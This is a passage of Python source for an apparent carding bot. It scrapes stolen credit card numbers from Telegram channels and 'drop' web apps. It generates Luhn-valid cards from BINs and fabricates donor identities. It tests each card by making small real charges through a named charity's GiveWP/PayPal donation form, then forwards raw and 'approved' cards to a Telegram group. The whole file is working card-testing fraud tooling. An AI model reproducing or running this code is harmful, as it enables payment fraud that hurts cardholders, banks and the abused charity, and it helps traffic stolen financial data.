                from telethon.errors import UserAlreadyParticipantError
                from telethon.tl.functions.messages import ImportChatInviteRequest, CheckChatInviteRequest, RequestAppWebViewRequest
                from telethon.tl.types import InputBotAppShortName

                client = TelegramClient(SESSION_NAME, API_ID, API_HASH)

                # ======================================================================
                # ENHANCED Card extraction (supports CC|MM|YY|CVV + optional fields, captures ZIP)
                # ======================================================================
                def extract_card_from_text(text: str):
                    """
                    Extracts card in format: CC|MM|YY|CVV (and optional extra fields like name|address|zip)
                    Returns tuple: (card, mm, yy, cvv, zip_or_none)
                    """
                    # Match pattern with up to 6 pipe-separated parts
                    # CC (15-16 digits), MM (1-2 digits), YY (2-4 digits), CVV (3-4 digits), then optional fields
                    pattern = re.compile(
                        r'(\d{15,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})(?:\|([^\|]*?))?(?:\|([^\|]*?))?(?:\|(\d{5})(?:\||$))?'
                    )
                    match = pattern.search(text)
                    if match:
                        card = match.group(1)
                        mm = match.group(2)
                        yy = match.group(3)
                        cvv = match.group(4)
                        # Look for 5-digit zip in any of the remaining groups (5,6,7)
                        zip_code = None
                        for i in range(5, 8):
                            part = match.group(i)
                            if part and re.match(r'^\d{5}$', part):
                                zip_code = part
                                break
                        if len(yy) == 2:
                            yy = f"20{yy}"
                        return (card, mm, yy, cvv, zip_code)

                    # Fallback: simple pattern without extra fields
                    simple = re.search(r'(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})\s*[|\/]\s*(\d{3,4})', text)
                    if simple:
                        card, mm, yy, cvv = simple.groups()
                        if len(yy) == 2:
                            yy = f"20{yy}"
                        return (card, mm, yy, cvv, None)

                    # Fallback without CVV
                    fallback = re.search(r'(\d{15,16})\s*[|\/]\s*(\d{1,2})\s*[|\/]\s*(\d{2,4})', text)
                    if fallback:
                        card, mm, yy = fallback.groups()
                        if len(yy) == 2:
                            yy = f"20{yy}"
                        return (card, mm, yy, "000", None)
                    return None

                # ======================================================================
                # BIN lookup (binlist.net)
                # ======================================================================
                async def get_bin_info(bin6: str) -> dict:
                    url = f"https://lookup.binlist.net/{bin6}"
                    headers = {"Accept-Version": "3"}
                    try:
                        async with aiohttp.ClientSession() as session:
                            async with session.get(url, headers=headers, timeout=10) as resp:
                                if resp.status == 200:
                                    data = await resp.json(content_type=None)
                                    return {
                                        "bank": data.get("bank", {}).get("name", "Unknown Bank"),
                                        "brand": data.get("scheme", "UNKNOWN").upper(),
                                        "type": data.get("type", "UNKNOWN").upper(),
                                        "country": data.get("country", {}).get("name", "Unknown"),
                                        "country_code": data.get("country", {}).get("alpha2", "XX"),
                                        "prepaid": data.get("prepaid", False),
                                        "level": data.get("brand", "STANDARD").upper(),
                                    }
                    except:
                        pass
                    return None

                # ======================================================================
                # Card generation
                # ======================================================================
                def luhn_sum(card: str) -> int:
                    total = 0
                    for i, ch in enumerate(card[::-1]):
                        n = int(ch)
                        if i % 2 == 1:
                            n *= 2
                            if n > 9:
                                n -= 9
                        total += n
                    return total

                def generate_card_number(bin_prefix: str) -> str:
                    bin_prefix = bin_prefix[:6]
                    is_amex = bin_prefix[:2] in ("34", "37")
                    length = 15 if is_amex else 16
                    fill_len = length - len(bin_prefix) - 1
                    body = bin_prefix + "".join(str(random.randint(0,9)) for _ in range(fill_len))
                    for check in range(10):
                        candidate = body + str(check)
                        if luhn_sum(candidate) % 10 == 0:
                            return candidate
                    return body + "0"

                def generate_expiry():
                    return f"{random.randint(1,12):02d}", str(random.randint(2025,2032))

                def generate_cvv(card: str) -> str:
                    return str(random.randint(1000,9999)) if card[:2] in ("34","37") else str(random.randint(100,999))

                def generate_card_with_bin(bin_prefix: str) -> str:
                    card = generate_card_number(bin_prefix)
                    mm, yy = generate_expiry()
                    cvv = generate_cvv(card)
                    return f"{card}|{mm}|{yy}|{cvv}"

                # ======================================================================
                # PayPal Charger (country‑aware addresses, fixed order creation)
                # ======================================================================
                FORM_VIEW_URL = "https://binnaclehouse.org/?givewp-route=donation-form-view&form-id=3945"
                AJAX_URL = "https://binnaclehouse.org/wp-admin/admin-ajax.php"
                FORM_ID = "3945"
                _BASE_HEADERS = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                }

                class PayPalCharger:
                    def __init__(self, proxy=None, bin_country=None):
                        self.session = requests.Session()
                        self.session.headers.update(_BASE_HEADERS)
                        if proxy:
                            self.session.proxies = {"http": proxy, "https": proxy}
                        self._proxy = proxy
                        self._bin_country = bin_country

                    # Country‑aware address generator (IT, GB, CA, AU, US)
                    def _random_address(self, country_code: str) -> Dict[str, str]:
                        first_names = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles",
                                       "Mary","Patricia","Jennifer","Linda","Elizabeth","Barbara","Susan","Jessica","Sarah","Karen"]
                        last_names = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez",
                                      "Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
                        first = random.choice(first_names)
                        last = random.choice(last_names)
                        domains = ["gmail.com","yahoo.com","outlook.com","hotmail.com","icloud.com","protonmail.com"]
                        email = f"{first.lower()}.{last.lower()}{random.randint(10,999)}@{random.choice(domains)}"
                        phone_prefix = random.choice(["06","02","081","011","091","010","051","055","041","045"])
                        phone = f"{phone_prefix}{random.randint(1000000,9999999)}"

                        if country_code == "IT":
                            cities = ["Rome","Milan","Naples","Turin","Palermo","Genoa","Bologna","Florence","Venice","Verona"]
                            provinces = ["RM","MI","NA","TO","PA","GE","BO","FI","VE","VR"]
                            postals = ["00118","20121","80121","10121","90121","16121","40121","50121","30121","37121"]
                            street_names = ["Via Roma","Corso Vittorio","Via Garibaldi","Via Manzoni","Via Dante","Via Cavour","Via Mazzini","Via XX Settembre","Via Nazionale","Via Tuscolana"]
                            index = random.randint(0, len(cities)-1)
                            city = cities[index]
                            state = provinces[index]
                            postal = postals[index]
                            street = f"{random.randint(1, 200)} {random.choice(street_names)}"
                            country = "IT"
                        elif country_code == "GB":
                            cities = ["London","Birmingham","Manchester","Glasgow","Liverpool","Bristol","Sheffield","Leeds","Edinburgh","Leicester"]
                            provinces = ["LND","WMD","MAN","GLG","LIV","BST","SHF","LDS","EDI","LCE"]
                            postals = ["EC1A","B1","M1","G1","L1","BS1","S1","LS1","EH1","LE1"]
                            street_names = ["High Street","King Street","Queen Street","Church Road","Station Road","Main Street","Park Lane","Victoria Street","London Road","Oxford Street"]
                            index = random.randint(0, len(cities)-1)
                            city = cities[index]
                            state = provinces[index]
                            postal = postals[index] + str(random.randint(1,9))
                            street = f"{random.randint(1, 200)} {random.choice(street_names)}"
                            country = "GB"
                        elif country_code == "CA":
                            cities = ["Toronto","Vancouver","Montreal","Calgary","Edmonton","Ottawa","Winnipeg","Quebec City","Hamilton","Halifax"]
                            provinces = ["ON","BC","QC","AB","MB","ON","QC","NS","ON","NS"]
                            postals = ["M5V2T6","V6B4Y8","H2X3Y4","T2P1J9","T5J2N9","K1P5E8","R3B0Y6","G1R4S9","L8P1A2","B3J2K9"]
                            street_names = ["Maple","Oak","Pine","Cedar","Birch","Elm","Walnut","Chestnut","Spruce","Willow"]
                            street_suffix = ["Ave","St","Rd","Cres","Blvd","Dr","Ln","Ct","Way","Place"]
                            index = random.randint(0, len(cities)-1)
                            city = cities[index]
                            state = provinces[index]
                            postal = postals[index]
                            street = f"{random.randint(1, 200)} {random.choice(street_names)} {random.choice(street_suffix)}"
                            country = "CA"
                        elif country_code == "AU":
                            cities = ["Sydney","Melbourne","Brisbane","Perth","Adelaide","Gold Coast","Canberra","Newcastle","Wollongong","Hobart"]
                            provinces = ["NSW","VIC","QLD","WA","SA","QLD","ACT","NSW","NSW","TAS"]
                            postals = ["2000","3000","4000","6000","5000","4217","2600","2300","2500","7000"]
                            street_names = ["George","Pitt","King","Queen","Elizabeth","William","Albert","Victoria","Oxford","Hyde"]
                            index = random.randint(0, len(cities)-1)
                            city = cities[index]
                            state = provinces[index]
                            postal = postals[index]
                            street = f"{random.randint(1, 200)} {random.choice(street_names)} St"
                            country = "AU"
                        else:  # default US
                            cities = ["Springfield","Columbus","Charlotte","Phoenix","Austin","Denver","Nashville","Portland","Louisville","Memphis",
                                      "Seattle","Las Vegas","Minneapolis","San Antonio","Jacksonville","Indianapolis","Fort Worth","San Jose","El Paso","Baltimore"]
                            states = ["AL","AK","AZ","AR","CA","CO","CT","DE","FL","GA","HI","ID","IL","IN","IA","KS","KY","LA","ME","MD",
                                      "MA","MI","MN","MS","MO","MT","NE","NV","NH","NJ","NM","NY","NC","ND","OH","OK","OR","PA","RI","SC",
                                      "SD","TN","TX","UT","VT","VA","WA","WV","WI","WY"]
                            street_names = ["Maple","Oak","Pine","Cedar","Birch","Elm","Walnut","Chestnut","Spruce","Willow",
                                            "Park","Lake","Hill","Main","Broadway","Lincoln","Washington","Franklin","Adams","Jefferson"]
                            street_suffixes = ["St","Ave","Rd","Dr","Ln","Ct","Blvd","Way","Place","Circle"]
                            index = random.randint(0, len(cities)-1)
                            city = cities[index]
                            state = random.choice(states)
                            postal = f"{random.randint(10000, 99950):05d}"
                            street = f"{random.randint(100, 9999)} {random.choice(street_names)} {random.choice(street_suffixes)}"
                            country = "US"
                            phone = f"{random.choice(['206','312','404','512','614','702','803','904','214','303'])}{random.randint(1000000,9999999)}"

                        return {
                            "first_name": first,
                            "last_name": last,
                            "email": email,
                            "line1": street,
                            "city": city,
                            "state": state,
                            "postal": postal,
                            "phone": phone,
                            "country": country,
                        }

                    def _random_donor(self, country_code: str = "US") -> Dict[str, str]:
                        return self._random_address(country_code)

                    def _random_amount(self) -> float:
                        return round(random.uniform(0.50, 2.00), 2)

                    def _get_form_data(self, retries=3):
                        for attempt in range(retries):
                            try:
                                self.session.get("https://binnaclehouse.org/donation/", timeout=15)
                                r = self.session.get(FORM_VIEW_URL, timeout=20)
                                r.raise_for_status()
                                m = re.search(r"window\.givewpDonationFormExports\s*=\s*(\{.*?\});\s*[\n\r]", r.text, re.S)
                                if not m:
                                    raise RuntimeError("givewpDonationFormExports block not found")
                                blob = m.group(1)
                                def _extract(key):
                                    match = re.search(rf'"{key}"\s*:\s*"([^"]+)"', blob)
                                    return match.group(1).replace("\\/", "/") if match else ""
                                nonce = _extract("donationFormNonce")
                                client_id = _extract("clientId")
                                if not nonce or not client_id:
                                    raise RuntimeError("Missing nonce or clientId")
                                return {"nonce": nonce, "client_id": client_id}
                            except Exception as e:
                                if attempt == retries-1:
                                    raise
                                time.sleep(2)
                                self.session = requests.Session()
                                self.session.headers.update(_BASE_HEADERS)
                                if self._proxy:
                                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

                    def _create_order(self, nonce, amount, retries=3):
                        for attempt in range(retries):
                            try:
                                resp = self.session.post(
                                    AJAX_URL,
                                    params={"action": "give_paypal_commerce_create_order"},
                                    data={
                                        "give-honeypot": "",
                                        "give-form-id": FORM_ID,
                                        "give-form-hash": nonce,
                                        "give-form-id-prefix": f"give-{FORM_ID}-0",
                                        "give-amount": f"{amount:.2f}",
                                        "give-gateway": "paypal-commerce",
                                        "payment-mode": "paypal-commerce",
                                    },
                                    headers={"X-Requested-With": "XMLHttpRequest"},
                                    timeout=30,
                                )
                                res = resp.json()
                                if res.get("success") and "data" in res and "id" in res["data"]:
                                    return res["data"]["id"]
                                else:
                                    raise RuntimeError(f"Order creation failed: {resp.text[:200]}")
                            except Exception as e:
                                if attempt == retries-1:
                                    raise
                                time.sleep(2)
                                self.session = requests.Session()
                                self.session.headers.update(_BASE_HEADERS)
                                if self._proxy:
                                    self.session.proxies = {"http": self._proxy, "https": self._proxy}

                    def _submit_payment(self, order_id, n, mm, yy, cvc, donor):
                        ua = self.session.headers["User-Agent"]
                        headers = {
                            "Host": "www.paypal.com",
                            "Paypal-Client-Context": order_id,
                            "X-App-Name": "standardcardfields",
                            "Paypal-Client-Metadata-Id": order_id,
                            "User-Agent": ua,
                            "Content-Type": "application/json",
                            "Accept": "*/*",
                            "Origin": "https://www.paypal.com",
                            "Referer": f"https://www.paypal.com/smart/card-fields?token={order_id}",
                        }
                        query = """
                        mutation payWithCard($token: String! $card: CardInput $phoneNumber: String $firstName: String $lastName: String
                            $shippingAddress: AddressInput $billingAddress: AddressInput $email: String $currencyConversionType: CheckoutCurrencyConversionType) {
                            approveGuestPaymentWithCreditCard(token: $token card: $card phoneNumber: $phoneNumber firstName: $firstName
                                lastName: $lastName email: $email shippingAddress: $shippingAddress billingAddress: $billingAddress
                                currencyConversionType: $currencyConversionType) { flags { is3DSecureRequired } cart { cartId } } }
                        """
                        address = {
                            "givenName": donor["first_name"],
                            "familyName": donor["last_name"],
                            "line1": donor["line1"],
                            "line2": None,
                            "city": donor["city"],
                            "state": donor["state"],
                            "postalCode": donor["postal"],
                            "country": donor["country"],
                        }
                        card_type = self._detect_card_type(n)
                        full_year = yy if len(yy) == 4 else f"20{yy}"
                        phone = donor["phone"]
                        variables = {
                            "token": order_id,
                            "card": {
                                "cardNumber": n,
                                "type": card_type,
                                "expirationDate": f"{mm}/{full_year}",
                                "postalCode": donor["postal"],
                                "securityCode": cvc,
                            },
                            "phoneNumber": phone,
                            "firstName": donor["first_name"],
                            "lastName": donor["last_name"],
                            "email": donor["email"],
                            "billingAddress": address,
                            "shippingAddress": address,
                            "currencyConversionType": "PAYPAL",
                        }
                        # Pre‑visit to set cookies
                        try:
                            self.session.get(f"https://www.paypal.com/smart/card-fields?token={order_id}&env=production",
                                             headers={"Referer": "https://binnaclehouse.org/donation/", "Accept": "text/html"}, timeout=15)
                        except:
                            pass
                        for use_proxy in [True, False]:
                            if not use_proxy and self._proxy:
                                self.session.proxies = None
                            for attempt in range(3):
                                try:
                                    resp = self.session.post(
                                        "https://www.paypal.com/graphql?approveGuestPaymentWithCreditCard",
                                        headers=headers,
                                        json={"query": query, "variables": variables},
                                        timeout=60,
                                    )
                                    if resp.status_code == 429:
                                        time.sleep(int(resp.headers.get("Retry-After", 10)))
                                        continue
                                    if resp.status_code == 200:
                                        try:
                                            res = resp.json()
                                            if "errors" in res:
                                                err_msg = res["errors"][0].get("message", "Unknown")
                                                code = res["errors"][0].get("data", [{}])[0].get("code", "")
                                                full = f"{err_msg} ({code})" if code else err_msg
                                                soft_hits = ["INSUFFICIENT_FUNDS", "CARD_AUTHORIZATION", "3D_SECURE",
                                                             "DO_NOT_HONOR", "TRANSACTION_REFUSED"]
                                                if any(k in full.upper() for k in soft_hits):
                                                    return f"APPROVED|{full}"
                                                else:
                                                    return f"DECLINED|{full}"
                                            if res.get("data", {}).get("approveGuestPaymentWithCreditCard"):
                                                return "CHARGED|Payment successful"
                                            return f"UNKNOWN|{resp.text[:150]}"
                                        except Exception as e:
                                            return f"PARSE_ERROR|{e}"
                                    else:
                                        continue
                                except requests.exceptions.ProxyError:
                                    break
                                except Exception as e:
                                    if attempt == 2:
                                        return f"ERROR|{e}"
                                    time.sleep(2)
                        return "DECLINED|No response after all retries"

                    @staticmethod
                    def _detect_card_type(n: str) -> str:
                        n = n.replace(" ", "").replace("-", "")
                        if n.startswith("4"): return "VISA"
                        if re.match(r"^5[1-5]|^2[2-7]", n): return "MASTER_CARD"
                        if n.startswith(("34", "37")): return "AMEX"
                        if n.startswith(("6011", "65")) or re.match(r"^64[4-9]", n): return "DISCOVER"
                        return "VISA"

                    def charge(self, cc: str) -> str:
                        parts = cc.strip().split("|")
                        if len(parts) < 4:
                            return "ERROR|Invalid format"
                        n, mm, yy, cvc = parts[:4]
                        if len(yy) == 4:
                            yy = yy[2:]
                        # Get BIN country hint
                        bin6 = n[:6]
                        country_code = "US"
                        try:
                            loop = asyncio.new_event_loop()
                            bin_info = loop.run_until_complete(get_bin_info(bin6))
                            loop.close()
                            if bin_info:
                                cc_code = bin_info.get("country_code")
                                if cc_code in ("IT", "GB", "CA", "AU", "US"):
                                    country_code = cc_code
                        except:
                            pass
                        donor = self._random_donor(country_code)
                        amount = self._random_amount()
                        logger.info(f"[PayPal] Checking {n[:4]}...{n[-4:]} with donor {donor['first_name']} {donor['last_name']} ({donor['email']}), amount=${amount:.2f}, country={country_code}")
                        try:
                            form_data = self._get_form_data()
                            order_id = self._create_order(form_data["nonce"], amount)
                            result = self._submit_payment(order_id, n, mm, yy, cvc, donor)
                            logger.info(f"[PayPal] Result: {result[:80]}")
                            return result
                        except Exception as e:
                            logger.error(f"[PayPal] ERROR: {e}")
                            return f"ERROR|{e}"

                # ======================================================================
                # xForce automation – uses copy button with security check wait
                # ======================================================================
                DEDUP_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "xforce_dedup.json")

                def xlog(tag, msg):
                    ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
                    print(f"[{ts}] [{tag}] {msg}", flush=True)
                    logger.info(msg)

                class XForceAutomator:
                    def __init__(self, bot_client, target_group):
                        self.bot_client = bot_client
                        self.target_group = target_group
                        self.processed_links = set()
                        self.processed_cards = set()
                        self._drop_queue = asyncio.Queue()
                        self._worker_task = None
                        self._load_state()

                    def _log(self, tag, msg):
                        xlog(tag, msg)

                    def _load_state(self):
                        try:
                            with open(DEDUP_FILE, "r") as f:
                                data = json.load(f)
                            self.processed_links = set(data.get("links", []))
                            self.processed_cards = set(data.get("cards", []))
                        except:
                            pass

                    def _save_state(self):
                        try:
                            with open(DEDUP_FILE, "w") as f:
                                json.dump({"links": list(self.processed_links), "cards": list(self.processed_cards)}, f)
                        except:
                            pass

                    async def _get_drop_url(self, event):
                        msg = event.message
                        if not msg.reply_markup:
                            return None
                        for row in msg.reply_markup.rows:
                            for btn in row.buttons:
                                if hasattr(btn, 'text') and "View Drop" in btn.text:
                                    if hasattr(btn, 'url') and btn.url:
                                        return btn.url
                        return None

                    async def _wait_for_security_check(self, page):
                        try:
                            await page.wait_for_function(
                                'document.body.innerText.includes("Analyzing security")',
                                timeout=15000
                            )
                            self._log("browser", "Security check detected, waiting for completion...")
                            await page.wait_for_function(
                                '!document.body.innerText.includes("Analyzing security")',
                                timeout=30000
                            )
                            self._log("browser", "Security check completed")
                            await asyncio.sleep(3)
                            return True
                        except Exception as e:
                            self._log("browser", f"Security check wait error: {e}")
                            return False

                    async def _wait_for_copy_button(self, page, timeout=30000):
                        """Prioritise button[class*='copy']"""
                        selectors = [
                            'button[class*="copy"]',          # <-- explicit selector from logs
                            'button[aria-label="Copy"]',
                            'button[title*="Copy"]',
                            'svg[data-icon="copy"]',
                            'i[class*="copy"]',
                            '.copy-btn',
                            'button:has-text("Copy")',
                            '[role="button"][aria-label*="copy"]',
                        ]
                        start = time.time()
                        while time.time() - start < timeout / 1000:
                            for sel in selectors:
                                try:
                                    btn = await page.query_selector(sel)
                                    if btn and await btn.is_visible() and await btn.is_enabled():
                                        self._log("browser", f"Copy button found: {sel}")
                                        return btn
                                except:
                                    continue
                            await asyncio.sleep(1)
                        return None

                    async def _click_copy_button(self, page):
                        btn = await self._wait_for_copy_button(page)
                        if btn:
                            await btn.click()
                            await asyncio.sleep(2)
                            return True
                        return False

                    async def _get_clipboard(self, page):
                        for attempt in range(5):
                            try:
                                clipboard = await page.evaluate("""
                                    async () => {
                                        try {
                                            const text = await navigator.clipboard.readText();
                                            return text;
                                        } catch(e) {
                                            return '';
                                        }
                                    }
                                """)
                                if clipboard and len(clipboard) > 10:
                                    return clipboard
                            except:
                                pass
                            await asyncio.sleep(1)
                        return ""

                    async def _click_open_drop(self, page):
                        try:
                            btn = await page.wait_for_selector('button:has-text("Open Drop")', timeout=30000)
                            if btn:
                                await btn.click()
                                self._log("browser", "Clicked Open Drop")
                                await asyncio.sleep(2)
                                await self._wait_for_security_check(page)
                                return True
                        except Exception as e:
                            self._log("browser", f"Open Drop error: {e}")
                        return False

                    async def _resolve_url(self, tme_url, source_peer):
                        try:
                            parsed = urllib.parse.urlparse(tme_url)
                            qs = urllib.parse.parse_qs(parsed.query)
                            startapp = qs.get("startapp", [None])[0]
                            if not startapp:
                                return tme_url
                            bot_entity = await self.bot_client.get_input_entity("xForceDropsBot")
                            if source_peer:
                                try:
                                    peer = await self.bot_client.get_input_entity(source_peer)
                                except:
                                    peer = bot_entity
                            else:
                                peer = bot_entity
                            result = await self.bot_client(RequestAppWebViewRequest(
                                peer=peer,
                                app=InputBotAppShortName(bot_id=bot_entity, short_name="webapp"),
                                platform="android",
                                start_param=startapp,
                                write_allowed=True,
                            ))
                            return result.url
                        except Exception as e:
                            self._log("resolve", f"Failed: {e}")
                            return tme_url

                    async def forward_raw_card(self, card_str: str, source: str = "drop", zip_code=None):
                        """Immediately forward the raw card data to target group."""
                        msg = f"💳 *RAW CARD ({source})*\n`{card_str}`"
                        if zip_code:
                            msg += f"\n📮 ZIP: `{zip_code}`"
                        try:
                            await self.bot_client.send_message(self.target_group, msg)
                            self._log("forward", f"✅ Raw card forwarded: {card_str[:20]}...")
                        except Exception as e:
                            self._log("forward", f"❌ Raw forward failed: {e}")

                    async def check_and_forward(self, n, mm, yy, cvv, zip_code=None):
                        card = f"{n}|{mm}|{yy}|{cvv}"
                        card_hash = hashlib.md5(card.encode()).hexdigest()
                        if card_hash in self.processed_cards:
                            return
                        self.processed_cards.add(card_hash)
                        self._save_state()

                        self._log("check", f"Checking {n[:4]}...{n[-4:]}")
                        loop = asyncio.get_event_loop()

                        # PayPal check
                        paypal_result = await loop.run_in_executor(None, PayPalCharger(proxy=ProxyManager.get()).charge, card)

                        # BIN info
                        bin_info = await get_bin_info(n[:6])

                        # Format PayPal result
                        if paypal_result.startswith("CHARGED"):
                            paypal_status = "CHARGED 💰"
                        elif paypal_result.startswith("APPROVED"):
                            paypal_status = "APPROVED 🟢"
                        elif paypal_result.startswith("DECLINED"):
                            paypal_status = "DECLINED 🔴"
                        else:
                            paypal_status = "ERROR ⚠️"
                        paypal_text = paypal_result.split("|", 1)[-1] if "|" in paypal_result else paypal_result

                        msg = (
                            f"┏━━━━━━━⍟\n┃ CARD CHECK 💳 ({BOT_USERNAME})\n┗━━━━━━━━━━━⊛\n"
                            f"[❃] 𝗖𝗮𝗿𝗱    ➜ `{card}`\n"
                        )
                        if zip_code:
                            msg += f"[❃] 𝗭𝗜𝗣     ➜ `{zip_code}`\n"
                        if bin_info:
                            msg += (
                                f"[❃] 𝗕𝗿𝗮𝗻𝗱  ➜ {bin_info.get('brand', 'UNKNOWN')}\n"
                                f"[❃] 𝗧𝘆𝗽𝗲   ➜ {bin_info.get('type', 'UNKNOWN')}\n"
                                f"[❃] 𝗕𝗮𝗻𝗸   ➜ {bin_info.get('bank', 'Unknown')}\n"
                                f"[❃] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆➜ {bin_info.get('country', 'Unknown')}\n"
                                f"[❃] 𝗟𝗲𝘃𝗲𝗹  ➜ {bin_info.get('level', 'STANDARD')}\n"
                                f"[❃] 𝗙𝗶𝗿𝘀𝘁𝟲➜ {n[:6]}\n[❃] 𝗟𝗮𝘀𝘁𝟰 ➜ {n[-4:]}\n"
                            )
                        msg += (
                            f"\n┏━━━━━━━⍟\n┃ PAYPAL CHECK 💳\n┗━━━━━━━━━━━⊛\n"
                            f"[❃] {paypal_status} | {paypal_text}\n"
                        )
                        try:
                            await self.bot_client.send_message(self.target_group, msg)
                            self._log("forward", f"✅ Forwarded {n[:4]}...{n[-4:]}" + (f" (ZIP: {zip_code})" if zip_code else ""))
                        except Exception as e:
                            self._log("forward", f"ERROR: {e}")

                    def _ensure_worker(self):
                        if self._worker_task is None or self._worker_task.done():
                            self._worker_task = asyncio.ensure_future(self._queue_worker())

                    async def _queue_worker(self):
                        while True:
                            try:
                                url, peer = await self._drop_queue.get()
                                await self._run_browser(url, peer)
                                self._drop_queue.task_done()
                            except asyncio.CancelledError:
                                break
                            except Exception as e:
                                self._log("worker", f"Error: {e}")

                    async def _run_browser(self, url, peer):
                        if not PLAYWRIGHT_OK:
                            return

                        resolved = await self._resolve_url(url, peer)
                        self._log("browser", f"Opening: {resolved[:100]}...")

                        _saved = os.environ.pop("LD_LIBRARY_PATH", None)
                        try:
                            async with async_playwright() as p:
                                browser = await p.chromium.launch(
                                    headless=True,
                                    executable_path=PLAYWRIGHT_EXECUTABLE_PATH,
                                    args=["--no-sandbox", "--disable-dev-shm-usage", "--disable-gpu"]
                                )
                                ctx = await browser.new_context(
                                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
                                    viewport={"width": 1280, "height": 720},
                                    permissions=["clipboard-read", "clipboard-write"],
                                )
                                page = await ctx.new_page()

                                await page.goto(resolved, wait_until="domcontentloaded", timeout=60000)
                                await page.wait_for_load_state("networkidle", timeout=30000)

                                # Handle interstitial
                                try:
                                    open_btn = await page.wait_for_selector('button:has-text("OPEN APP")', timeout=5000)
                                    if open_btn:
                                        await open_btn.click()
                                        await asyncio.sleep(3)
                                except:
                                    pass

                                # Click Open Drop and wait for security check
                                success = await self._click_open_drop(page)
                                if not success:
                                    self._log("browser", "Failed to click Open Drop or security check timed out")
                                    await browser.close()
                                    return

                                # Try to get card via copy button
                                if await self._click_copy_button(page):
                                    clipboard = await self._get_clipboard(page)
                                    if clipboard:
                                        card_data = extract_card_from_text(clipboard)
                                        if card_data:
                                            n, mm, yy, cvv, zip_code = card_data
                                            card_str = f"{n}|{mm}|{yy}|{cvv}"
                                            card_hash = hashlib.md5(card_str.encode()).hexdigest()
                                            if card_hash not in self.processed_cards:
                                                # Forward raw card immediately
                                                await self.forward_raw_card(card_str, source="clipboard", zip_code=zip_code)
                                                # Then do full PayPal check
                                                await self.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
                                            await browser.close()
                                            return

                                # Fallback: try to find card in DOM
                                content = await page.content()
                                card_data = extract_card_from_text(content)
                                if card_data:
                                    n, mm, yy, cvv, zip_code = card_data
                                    card_str = f"{n}|{mm}|{yy}|{cvv}"
                                    card_hash = hashlib.md5(card_str.encode()).hexdigest()
                                    if card_hash not in self.processed_cards:
                                        await self.forward_raw_card(card_str, source="dom", zip_code=zip_code)
                                        await self.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
                                    await browser.close()
                                    return

                                self._log("browser", "❌ No card found after all attempts")
                                await browser.close()

                        except Exception as e:
                            self._log("browser", f"Error: {e}")
                        finally:
                            if _saved is not None:
                                os.environ["LD_LIBRARY_PATH"] = _saved

                    async def on_message(self, event):
                        text = event.raw_text or ""

                        # Check for View Drop/Open Drop messages
                        if "View Drop" in text or "VIEW DROP" in text.upper() or "Open Drop" in text:
                            url = await self._get_drop_url(event)
                            if url and url not in self.processed_links:
                                self.processed_links.add(url)
                                self._save_state()
                                await self._drop_queue.put((url, event.chat))
                                self._ensure_worker()
                            return

                        # Check for direct card in message
                        card_data = extract_card_from_text(text)
                        if card_data:
                            n, mm, yy, cvv, zip_code = card_data
                            await self.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)

                # ======================================================================
                # Main bot logic
                # ======================================================================
                async def find_entity_by_title(title: str):
                    title_lower = title.lower()
                    async for dialog in client.iter_dialogs():
                        if hasattr(dialog.entity, "title") and dialog.entity.title:
                            if title_lower in dialog.entity.title.lower():
                                return dialog.entity
                    return None

                async def join_and_resolve(chat: str):
                    if chat.startswith("+") or "t.me/+" in chat or "joinchat" in chat:
                        invite = chat.lstrip("+")
                        if "t.me/+" in chat:
                            invite = chat.split("t.me/+")[-1]
                        elif "joinchat/" in chat:
                            invite = chat.split("joinchat/")[-1]
                        try:
                            result = await client(ImportChatInviteRequest(invite))
                            return result.chats[0]
                        except UserAlreadyParticipantError:
                            try:
                                info = await client(CheckChatInviteRequest(hash=invite))
                                chat_obj = getattr(info, 'chat', None)
                                if chat_obj:
                                    print(f"[OK] Already in group: {getattr(chat_obj, 'title', invite)}")
                                    return chat_obj
                            except:
                                pass
                            async for dialog in client.iter_dialogs():
                                e = dialog.entity
                                if getattr(e, 'megagroup', False) or getattr(e, 'broadcast', False):
                                    return e
                            return None
                        except Exception as e:
                            logger.error(f"Join failed for {chat}: {e}")
                            return None
                    else:
                        try:
                            return await client.get_entity(chat)
                        except:
                            pass
                        entity = await find_entity_by_title(chat)
                        if entity:
                            return entity
                        logger.error(f"Resolve failed for: {chat}")
                        return None

                async def run_scraper():
                    await client.start()
                    print(f"[🤖 {BOT_USERNAME}] Bot online", flush=True)
                    print(f"📡 Watching: {SOURCE_CHATS_RAW}", flush=True)
                    print(f"📤 Forwarding to: {FORWARD_TARGET}", flush=True)
                    if not PLAYWRIGHT_OK:
                        print("[WARN] Playwright missing – xForce drops disabled", flush=True)

                    resolved = []
                    for chat in SOURCE_CHATS_RAW:
                        entity = await join_and_resolve(chat)
                        if entity:
                            resolved.append(entity)
                            title = getattr(entity, 'title', None) or getattr(entity, 'username', chat)
                            print(f"[OK] Watching: {title}", flush=True)
                        else:
                            print(f"[WARN] Could not resolve: {chat}", flush=True)

                    if not resolved:
                        print("[ERROR] No channels resolved.", flush=True)
                        return

                    xforce = XForceAutomator(client, FORWARD_TARGET)

                    async def handle_messages(event):
                        text = event.raw_text or ""
                        card_data = extract_card_from_text(text)
                        if card_data:
                            n, mm, yy, cvv, zip_code = card_data
                            await xforce.check_and_forward(n, mm, yy, cvv, zip_code=zip_code)
                        await xforce.on_message(event)

                    client.add_event_handler(handle_messages, events.NewMessage(chats=resolved))
                    client.add_event_handler(xforce.on_message, events.NewMessage(chats=[XFORCE_BOT_USERNAME], incoming=True))

                    # Commands
                    async def handle_commands(event):
                        text = (event.raw_text or "").strip()
                        parts = text.split(None, 2)
